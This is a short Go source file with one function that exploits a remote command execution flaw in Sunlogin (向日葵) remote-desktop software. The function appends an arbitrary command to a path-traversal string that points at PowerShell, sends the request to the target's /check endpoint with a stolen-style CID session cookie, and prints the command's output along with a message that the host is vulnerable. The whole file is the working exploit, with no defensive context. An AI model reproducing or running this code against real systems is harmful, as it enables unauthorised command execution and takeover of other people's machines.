package DataHandle

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"time"
)

func RCE(cmd string, cookie string, url string) {
	url1 := url + `/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+%20` + cmd
	req, err := http.NewRequest("Get", url1, nil)
	if err != nil {
		return
	}
	req.Header.Add("Cookie", "CID="+cookie)
	client := http.Client{Timeout: 5 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return
	}
	fmt.Printf("\n%v存在向日葵RCE漏洞,%v执行结果：%v\n", url, cmd, string(body))
}
